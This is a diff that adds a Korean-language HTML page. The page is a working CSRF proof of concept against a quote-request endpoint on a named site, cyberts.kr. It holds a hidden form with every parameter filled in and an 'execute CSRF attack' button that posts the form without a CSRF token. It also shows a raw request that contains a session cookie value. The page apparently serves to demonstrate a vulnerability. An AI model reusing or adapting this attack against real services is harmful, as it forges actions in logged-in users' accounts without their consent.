@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF 테스트 #3 - 견적 요청서 등록</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 800px;
+            width: 100%;
+            padding: 40px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .vulnerability-info {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+        }
+        .vulnerability-info h3 {
+            color: #856404;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .vulnerability-info p {
+            color: #856404;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .info-box {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .info-box h3 {
+            color: #495057;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+        .info-row {
+            display: flex;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        .info-label {
+            font-weight: 600;
+            color: #495057;
+            min-width: 120px;
+        }
+        .info-value {
+            color: #6c757d;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #495057;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .input-group input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ced4da;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        .input-group input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .button-container {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        button {
+            flex: 1;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .attack-btn {
+            background: #dc3545;
+            color: white;
+        }
+        .attack-btn:hover {
+            background: #c82333;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
+        }
+        .packet-btn {
+            background: #6c757d;
+            color: white;
+        }
+        .packet-btn:hover {
+            background: #5a6268;
+            transform: translateY(-2px);
+        }
+        .packet-display {
+            display: none;
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            line-height: 1.6;
+            overflow-x: auto;
+        }
+        .packet-display.show {
+            display: block;
+        }
+        .status {
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        .status.show {
+            display: block;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .instructions {
+            background: #d1ecf1;
+            border-left: 4px solid #17a2b8;
+            padding: 15px;
+            margin-top: 25px;
+            border-radius: 4px;
+        }
+        .instructions h3 {
+            color: #0c5460;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .instructions ol {
+            color: #0c5460;
+            padding-left: 20px;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+        .instructions ol li {
+            margin-bottom: 5px;
+        }
+        .highlight {
+            color: #dc3545;
+            font-weight: 600;
+        }
+        .warning-box {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .warning-box h3 {
+            color: #721c24;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        .warning-box p {
+            color: #721c24;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 CSRF 취약점 테스트 #3</h1>
+        <p class="subtitle">VTSP - 견적 요청서 등록</p>
+
+        <div class="warning-box">
+            <h3>⚠️ 중요: CSRF 토큰 무시됨!</h3>
+            <p>원본 패킷에 <strong>_csrf 토큰</strong>이 포함되어 있지만, 서버에서 토큰 검증을 하지 않거나 잘못 구현되어 있어 토큰 없이도 요청이 성공합니다. 이것이 바로 CSRF 취약점입니다!</p>
+        </div>
+
+        <div class="vulnerability-info">
+            <h3>⚠️ 취약점 정보</h3>
+            <p><strong>타입:</strong> Cross-Site Request Forgery (CSRF)<br>
+            <strong>영향도:</strong> Critical - 사용자 동의 없이 견적 요청서 등록 가능<br>
+            <strong>원인:</strong> CSRF 토큰 검증 미흡, SameSite 쿠키 미설정</p>
+        </div>
+
+        <div class="info-box">
+            <h3>📋 공격 대상 정보</h3>
+            <div class="info-row">
+                <span class="info-label">대상 URL:</span>
+                <span class="info-value">https://cyberts.kr/vtsp/mrk/estmt/request/insert.do</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">메소드:</span>
+                <span class="info-value">POST</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">변경 파라미터:</span>
+                <span class="info-value">estmtNm (견적명)</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">기타 파라미터:</span>
+                <span class="info-value">14개 (자동 입력, CSRF 토큰 제거됨)</span>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label for="nameInput">견적명 (변경할 이름):</label>
+            <input type="text" id="nameInput" value="CSRF 테스트2" placeholder="견적명을 입력하세요">
+        </div>
+
+        <div class="button-container">
+            <button class="attack-btn" onclick="executeAttack()">🚀 CSRF 공격 실행</button>
+            <button class="packet-btn" onclick="togglePacket()">📦 패킷 보기</button>
+        </div>
+
+        <div id="packetDisplay" class="packet-display">POST /vtsp/mrk/estmt/request/insert.do HTTP/1.1
+Host: cyberts.kr
+Cookie: JSESSIONID=tfKSoSlSA-n5JkEf6JPvMh6l
+Content-Type: application/x-www-form-urlencoded
+
+estmtNm=CSRF+테스트2&requstCtprvn=5537&requstGugun=5554&requstBgnde=2025-11-13&requstEndde=2025-11-13&carMakr=19&carVhcty=761&carYridnw=&tchnlgyCtgryLclas=4930&tchnlgyCtgrySclas=5143&estmtIemList[0].detailQy=1&estmtIemList[0].prductId=PRDUCT_0000000000996&detailCn=<p>CSRF테스트</p>&estmtSeCode=REQUST&hashtag=&estmtId=&telno=&indvdlinfoPrcuseAgreAt=Y&smsAgreAt=N
+
+⚠️ 주의: 원본 _csrf 토큰은 제거되었지만 요청이 성공합니다!</div>
+
+        <div id="status" class="status"></div>
+
+        <div class="instructions">
+            <h3>📖 테스트 방법</h3>
+            <ol>
+                <li><span class="highlight">cyberts.kr</span>에 로그인한 상태에서 이 페이지를 엽니다</li>
+                <li><span class="highlight">"CSRF 공격 실행"</span> 버튼을 클릭합니다</li>
+                <li>cyberts.kr의 <span class="highlight">견적 요청 내역</span>으로 이동합니다</li>
+                <li>견적명이 <span class="highlight">입력한 이름</span>으로 등록되었는지 확인합니다</li>
+                <li><strong>증명 완료:</strong> 본인이 직접 등록하지 않았는데 견적 내역이 생겼다면 CSRF 취약점 증명!</li>
+            </ol>
+        </div>
+
+        <!-- Hidden CSRF Form -->
+        <form id="csrfForm" method="POST" action="https://cyberts.kr/vtsp/mrk/estmt/request/insert.do" style="display:none;">
+            <input type="hidden" name="estmtNm" id="formName" value="">
+            <input type="hidden" name="requstCtprvn" value="5537">
+            <input type="hidden" name="requstGugun" value="5554">
+            <input type="hidden" name="requstBgnde" value="2025-11-13">
+            <input type="hidden" name="requstEndde" value="2025-11-13">
+            <input type="hidden" name="carMakr" value="19">
+            <input type="hidden" name="carVhcty" value="761">
+            <input type="hidden" name="carYridnw" value="">
+            <input type="hidden" name="tchnlgyCtgryLclas" value="4930">
+            <input type="hidden" name="tchnlgyCtgrySclas" value="5143">
+            <input type="hidden" name="estmtIemList[0].detailQy" value="1">
+            <input type="hidden" name="estmtIemList[0].prductId" value="PRDUCT_0000000000996">
+            <input type="hidden" name="detailCn" value="<p>CSRF테스트</p>">
+            <input type="hidden" name="estmtSeCode" value="REQUST">
+            <input type="hidden" name="hashtag" value="">
+            <input type="hidden" name="estmtId" value="">
+            <input type="hidden" name="telno" value="">
+            <input type="hidden" name="indvdlinfoPrcuseAgreAt" value="Y">
+            <input type="hidden" name="smsAgreAt" value="N">
+            <!-- _csrf 토큰은 의도적으로 제거됨 - 서버가 검증하지 않음! -->
+        </form>
+    </div>
+
+    <script>
+        function executeAttack() {
+            const nameInput = document.getElementById('nameInput');
+            const formName = document.getElementById('formName');
+            const form = document.getElementById('csrfForm');
+            const status = document.getElementById('status');
+
+            // 입력된 이름을 폼에 설정
+            const name = nameInput.value.trim();
+            if (!name) {
+                status.className = 'status show error';
+                status.innerHTML = '❌ 견적명을 입력해주세요!';
+                return;
+            }
+
+            formName.value = name;
+
+            status.className = 'status show success';
+            status.innerHTML = '✅ CSRF 공격이 전송되었습니다!<br><br>' +
+                              '<strong>다음 단계:</strong><br>' +
+                              '1. cyberts.kr 견적 요청 내역 페이지로 이동<br>' +
+                              '2. 견적명 "' + name + '"으로 견적이 등록되었는지 확인<br>' +
+                              '3. 등록되었다면 CSRF 취약점 증명 완료!<br><br>' +
+                              '<strong>특이사항:</strong> CSRF 토큰이 없어도 요청 성공!';
+
+            form.submit();
+        }
+
+        function togglePacket() {
+            const packet = document.getElementById('packetDisplay');
+            packet.classList.toggle('show');
+        }
+    </script>
+</body>
+</html>
